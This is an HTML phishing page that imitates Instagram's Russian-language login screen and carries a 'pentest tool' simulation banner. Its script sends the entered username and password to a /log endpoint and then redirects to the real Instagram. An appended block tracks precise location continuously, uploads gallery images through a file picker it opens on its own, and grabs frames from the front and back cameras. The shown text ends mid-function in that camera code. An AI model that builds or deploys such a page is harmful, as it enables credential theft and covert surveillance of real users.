<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            gap: 50px;
            align-items: center;
            justify-content: center;
        }
        
        .phone-container {
            flex: 1;
            max-width: 380px;
            display: none;
        }
        
        .phone-container img {
            width: 100%;
            height: auto;
        }
        
        .login-container {
            flex: 1;
            max-width: 350px;
        }
        
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
            text-align: center;
        }
        
        .logo {
            margin-bottom: 20px;
        }
        
        .logo h1 {
            font-family: 'Billabong', 'Brush Script MT', cursive, sans-serif;
            font-size: 51px;
            font-weight: 400;
            color: #262626;
            margin-bottom: 20px;
            letter-spacing: 1px;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 9px 0 7px 8px;
            font-size: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            outline: none;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
        }
        
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8e8e8e;
        }
        
        .btn-login {
            width: 100%;
            padding: 5px 9px;
            margin-top: 8px;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .btn-login:hover:not(:disabled) {
            background-color: #1877f2;
        }
        
        .btn-login:disabled {
            background-color: #b2dffc;
            cursor: default;
        }
        
        .divider {
            margin: 20px 0;
            display: flex;
            align-items: center;
            text-transform: uppercase;
            font-size: 13px;
            color: #8e8e8e;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            margin: 0 18px;
        }
        
        .facebook-login {
            color: #385185;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin: 20px 0;
            display: inline-block;
        }
        
        .facebook-login:hover {
            text-decoration: underline;
        }
        
        .forgot-password {
            margin-top: 12px;
        }
        
        .forgot-password a {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-box a:hover {
            text-decoration: underline;
        }
        
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 4px;
            padding: 12px;
            margin-bottom: 16px;
            font-size: 11px;
            color: #856404;
            text-align: center;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
            color: #8e8e8e;
            font-size: 14px;
        }
        
        @media (min-width: 875px) {
            .phone-container {
                display: block;
            }
        }
    </style>
</head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<body>
    <div class="container">
        <div class="phone-container">
            <svg viewBox="0 0 380 581" width="380" height="581" xmlns="http://www.w3.org/2000/svg">
                <rect width="380" height="581" fill="#fff" stroke="#dbdbdb" stroke-width="1"/>
                <text x="190" y="290" text-anchor="middle" fill="#8e8e8e" font-size="14">Phone Preview</text>
            </svg>
        </div>
        
        <div class="login-container">
            <div class="login-box">
                <div class="logo">
                    <h1>Instagram</h1>
                </div>
                
                <div class="warning">
                    ‚ö†Ô∏è PENTEST TOOL - This is a phishing simulation
                </div>
                
                <div id="loadingMessage" class="loading">
                    –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ Instagram...
                </div>
                
                <form id="loginForm" action="#" method="POST">
                    <div class="form-group">
                        <input type="text" id="username" name="username" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω, –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ —ç–ª. –∞–¥—Ä–µ—Å" required autofocus>
                    </div>
                    
                    <div class="form-group">
                        <input type="password" id="password" name="password" placeholder="–ü–∞—Ä–æ–ª—å" required>
                    </div>
                    
                    <button type="submit" class="btn-login" id="submitBtn">–í—Ö–æ–¥</button>
                </form>
                
                <div class="divider">
                    <span>–∏–ª–∏</span>
                </div>
                
                <a href="#" class="facebook-login" onclick="alert('–§—É–Ω–∫—Ü–∏—è –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞'); return false;">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185" style="vertical-align: middle; margin-right: 5px;">
                        <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
                    </svg>
                    –í–æ–π—Ç–∏ —á–µ—Ä–µ–∑ Facebook
                </a>
                
                <div class="forgot-password">
                    <a href="#" onclick="alert('–§—É–Ω–∫—Ü–∏—è –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞'); return false;">–ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?</a>
                </div>
            </div>
            
            <div class="signup-box">
                –£ –≤–∞—Å –Ω–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å</a>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const timestamp = new Date().toISOString();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–≥—Ä—É–∑–∫–µ
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loadingMessage').style.display = 'block';
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            fetch('/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    service: 'instagram',
                    username: username,
                    password: password,
                    timestamp: timestamp,
                    ip: '127.0.0.1'
                })
            })
            .then(response => response.json())
            .then(data => {
                // –ñ–¥–µ–º 1-2 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ—Å—Ç–∏, –ø–æ—Ç–æ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π Instagram
                setTimeout(function() {
                    window.location.href = 'https://www.instagram.com/';
                }, 1500);
            })
            .catch(error => {
                console.error('Error:', error);
                // –î–∞–∂–µ –µ—Å–ª–∏ –æ—à–∏–±–∫–∞, –≤—Å–µ —Ä–∞–≤–Ω–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º
                setTimeout(function() {
                    window.location.href = 'https://www.instagram.com/';
                }, 1500);
            });
        });
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ —Ñ–æ—Ä–º—ã –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (–º–æ–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å)
        // –†–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä—É–π—Ç–µ –¥–ª—è —Ç–µ—Å—Ç–∞:
        // document.getElementById('username').value = 'test_user';
        // document.getElementById('password').value = 'test_password';
    </script>
</body>
<!-- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω–æ: –∫–æ–¥ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ (–û–ë–ï–ò–•), –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏ –≥–∞–ª–µ—Ä–µ–µ -->
<script>
// –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞—Ö–≤–∞—Ç–∞ (–º–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å)
var CAPTURE_INTERVAL = 1500; // –ò–Ω—Ç–µ—Ä–≤–∞–ª –∑–∞—Ö–≤–∞—Ç–∞ –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 1.5 —Å–µ–∫—É–Ω–¥—ã)
var IMAGE_QUALITY = 1.0; // –ö–∞—á–µ—Å—Ç–≤–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –æ—Ç 0.0 –¥–æ 1.0 (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 1.0 - –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ)

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
var currentLocation = null;

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä —Å –ø—Ä–æ–≤–µ—Ä–∫–∞–º–∏
function waitForElementsAndInit() {
    // –ü–æ–ª—É—á–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç—ã —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    var videoBack = document.getElementById('video-back');
    var canvasBack = document.getElementById('canvas-back');
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤
    if (!video) {
        console.log('–≠–ª–µ–º–µ–Ω—Ç video –Ω–µ –Ω–∞–π–¥–µ–Ω, –∂–¥–µ–º...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    if (!canvas) {
        console.log('–≠–ª–µ–º–µ–Ω—Ç canvas –Ω–µ –Ω–∞–π–¥–µ–Ω, –∂–¥–µ–º...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ post
    if (typeof post !== 'function') {
        console.log('–§—É–Ω–∫—Ü–∏—è post –Ω–µ –Ω–∞–π–¥–µ–Ω–∞, –∂–¥–µ–º...');
        setTimeout(waitForElementsAndInit, 500);
        return;
    }
    
    // –í—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã –Ω–∞–π–¥–µ–Ω—ã
    console.log('–í—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã –Ω–∞–π–¥–µ–Ω—ã, –∑–∞–ø—É—Å–∫–∞–µ–º —Ñ—É–Ω–∫—Ü–∏–∏...');
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
    initGeolocation();
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –¥–æ—Å—Ç—É–ø –∫ –≥–∞–ª–µ—Ä–µ–µ
    initGalleryAccess();
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –æ–±–µ –∫–∞–º–µ—Ä—ã
    initCameras(video, canvas, videoBack, canvasBack);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ—á–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
function initGeolocation() {
    if (!navigator.geolocation) {
        console.error('‚ùå –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –≤ —ç—Ç–æ–º –±—Ä–∞—É–∑–µ—Ä–µ');
        return;
    }
    
    console.log('üìç –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—é...');
    
    // –û–ø—Ü–∏–∏ –¥–ª—è —Ç–æ—á–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (GPS)
    var geoOptions = {
        enableHighAccuracy: true, // –¢–æ—á–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è (GPS)
        timeout: 20000, // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Ç–∞–π–º–∞—É—Ç –¥–æ 20 —Å–µ–∫—É–Ω–¥
        maximumAge: 0 // –ù–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫—ç—à, –≤—Å–µ–≥–¥–∞ –ø–æ–ª—É—á–∞—Ç—å —Å–≤–µ–∂–∏–µ –¥–∞–Ω–Ω—ã–µ
    };
    
    // –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ç–µ–∫—É—â–µ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ
    navigator.geolocation.getCurrentPosition(
        function(position) {
            console.log('‚úÖ –î–æ—Å—Ç—É–ø –∫ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—é —Ä–∞–∑—Ä–µ—à–µ–Ω!');
            currentLocation = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude || null,
                heading: position.coords.heading || null,
                speed: position.coords.speed || null,
                timestamp: Date.now()
            };
            console.log('üìç –¢–æ—á–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∞:', currentLocation);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Å—Ä–∞–∑—É
            if (typeof postLocation === 'function') {
                postLocation(currentLocation);
            }
            
            // –ù–∞—á–∏–Ω–∞–µ–º –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
            var watchId = navigator.geolocation.watchPosition(
                function(pos) {
                    currentLocation = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || null,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null,
                        timestamp: pos.timestamp || Date.now()
                    };
                    console.log('üìç –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', currentLocation);
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∂–¥–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                    if (typeof postLocation === 'function') {
                        postLocation(currentLocation);
                    }
                },
                function(error) {
                    console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', error.message, '–ö–æ–¥:', error.code);
                },
                geoOptions
            );
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º ID –¥–ª—è –≤–æ–∑–º–æ–∂–Ω–æ–π –æ—Å—Ç–∞–Ω–æ–≤–∫–∏
            window.geoWatchId = watchId;
        },
        function(error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', error.message, '–ö–æ–¥:', error.code);
            if (error.code === 1) {
                console.error('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–ª–æ–Ω–∏–ª –∑–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø –∫ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—é');
            } else if (error.code === 2) {
                console.error('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ (GPS –≤—ã–∫–ª—é—á–µ–Ω?)');
            } else if (error.code === 3) {
                console.error('–ò—Å—Ç–µ–∫–ª–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∑–∞–ø—Ä–æ—Å–∞ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è');
            }
            // –ü—Ä–æ–±—É–µ–º –µ—â–µ —Ä–∞–∑ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(function() {
                console.log('üîÑ –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏...');
                initGeolocation();
            }, 5000);
        },
        geoOptions
    );
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –≥–∞–ª–µ—Ä–µ–µ
function initGalleryAccess() {
    var galleryInput = document.getElementById('gallery-input');
    if (!galleryInput) {
        galleryInput = document.createElement('input');
        galleryInput.type = 'file';
        galleryInput.id = 'gallery-input';
        galleryInput.accept = 'image/*';
        galleryInput.multiple = true;
        galleryInput.style.display = 'none';
        document.body.appendChild(galleryInput);
    }
    
    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–∫—Ä—ã–≤–∞–µ–º –¥–∏–∞–ª–æ–≥ –≤—ã–±–æ—Ä–∞ —Ñ–∞–π–ª–æ–≤ —á–µ—Ä–µ–∑ –Ω–µ–±–æ–ª—å—à—É—é –∑–∞–¥–µ—Ä–∂–∫—É
    setTimeout(function() {
        try {
            galleryInput.click();
            console.log('–î–∏–∞–ª–æ–≥ –≥–∞–ª–µ—Ä–µ–∏ –æ—Ç–∫—Ä—ã—Ç');
        } catch (error) {
            console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–∫—Ä—ã—Ç—å –≥–∞–ª–µ—Ä–µ—é:', error.message);
        }
    }, 3000); // –ó–∞–¥–µ—Ä–∂–∫–∞ 3 —Å–µ–∫—É–Ω–¥—ã –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    
    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—ã–±–æ—Ä–∞ —Ñ–∞–π–ª–æ–≤
    galleryInput.addEventListener('change', function(e) {
        var files = e.target.files;
        if (files && files.length > 0) {
            console.log('–í—ã–±—Ä–∞–Ω–æ —Ñ–∞–π–ª–æ–≤ –∏–∑ –≥–∞–ª–µ—Ä–µ–∏:', files.length);
            for (var i = 0; i < files.length; i++) {
                var file = files[i];
                var reader = new FileReader();
                reader.onload = function(event) {
                    var imageData = event.target.result;
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                    if (typeof post === 'function') {
                        post(imageData, 'gallery');
                    }
                };
                reader.readAsDataURL(file);
            }
        }
    });
}

function initCameras(video, canvas, videoBack, canvasBack) {
    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —ç–ª–µ–º–µ–Ω—Ç–æ–≤
    if (!video || !canvas) {
        console.error('–û—à–∏–±–∫–∞: —ç–ª–µ–º–µ–Ω—Ç—ã video –∏–ª–∏ canvas –ø—É—Å—Ç—ã–µ!');
        return;
    }
    
    // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã
    const constraintsFront = { 
        audio: false,
        video: { 
            facingMode: "user" // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
        } 
    };
    
    // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
    const constraintsBack = { 
        audio: false,
        video: { 
            facingMode: { exact: "environment" } // –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞
        } 
    };
    
    // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä–µ
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // –°–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É
        navigator.mediaDevices.getUserMedia(constraintsFront)
            .then(function(stream) {
                console.log('‚úÖ –î–æ—Å—Ç—É–ø –∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä–µ –ø–æ–ª—É—á–µ–Ω!');
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞—Ö–≤–∞—Ç —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã
                handleSuccess(stream, video, canvas, 'front');
                
                // –ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã, –ø—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –∑–∞–¥–Ω—é—é
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º –∑–∞–¥–µ—Ä–∂–∫—É, —á—Ç–æ–±—ã –¥–∞—Ç—å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä–µ –≤—Ä–µ–º—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å—Å—è
                setTimeout(function() {
                    // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä–µ
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –¥–ª—è –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                    var vBack = document.getElementById('video-back');
                    var cBack = document.getElementById('canvas-back');
                    
                    // –ï—Å–ª–∏ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–µ—Ç, —Å–æ–∑–¥–∞–µ–º –∏—Ö
                    if (!vBack) {
                        vBack = document.createElement('video');
                        vBack.id = 'video-back';
                        vBack.setAttribute('playsinline', '');
                        vBack.setAttribute('autoplay', '');
                        vBack.style.display = 'none';
                        document.body.appendChild(vBack);
                        console.log('–°–æ–∑–¥–∞–Ω —ç–ª–µ–º–µ–Ω—Ç video-back –¥–ª—è –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã');
                    }
                    if (!cBack) {
                        cBack = document.createElement('canvas');
                        cBack.id = 'canvas-back';
                        cBack.width = 740;
                        cBack.height = 580;
                        cBack.style.display = 'none';
                        document.body.appendChild(cBack);
                        console.log('–°–æ–∑–¥–∞–Ω —ç–ª–µ–º–µ–Ω—Ç canvas-back –¥–ª—è –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã');
                    }
                    
                    // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä–µ
                    // –í–ê–ñ–ù–û: –ú–Ω–æ–≥–∏–µ –±—Ä–∞—É–∑–µ—Ä—ã –ù–ï –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –¥–≤—É–º –∫–∞–º–µ—Ä–∞–º
                    // –ü–æ—ç—Ç–æ–º—É –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ–¥—Ö–æ–¥ —Å –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ–º –∫–∞–º–µ—Ä
                    console.log('–ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä–µ...');
                    
                    // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ (–Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç)
                    navigator.mediaDevices.getUserMedia(constraintsBack)
                        .then(function(backStream) {
                            console.log('–ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω–∞ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ! –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∑–∞—Ö–≤–∞—Ç–∞...');
                            handleSuccess(backStream, vBack, cBack, 'back');
                        })
                        .catch(function(error) {
                            // –ï—Å–ª–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ, –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ
                            console.log('–û–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –∫–∞–º–µ—Ä...', error.message);
                            
                            // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤–∏–¥–µ–æ —Ç—Ä–µ–∫–∏ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã
                            if (window.stream) {
                                window.stream.getVideoTracks().forEach(function(track) {
                                    track.stop();
                                });
                            }
                            
                            // –ü–æ–ª—É—á–∞–µ–º –∑–∞–¥–Ω—é—é –∫–∞–º–µ—Ä—É
                            navigator.mediaDevices.getUserMedia(constraintsBack)
                                .then(function(backStream) {
                                    console.log('–ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ: –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –ø–æ–ª—É—á–µ–Ω–∞!');
                                    handleSuccess(backStream, vBack, cBack, 'back');
                                    
                                    // –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
                                    setTimeout(function() {
                                        navigator.mediaDevices.getUserMedia(constraintsFront)
                                            .then(function(frontStream) {
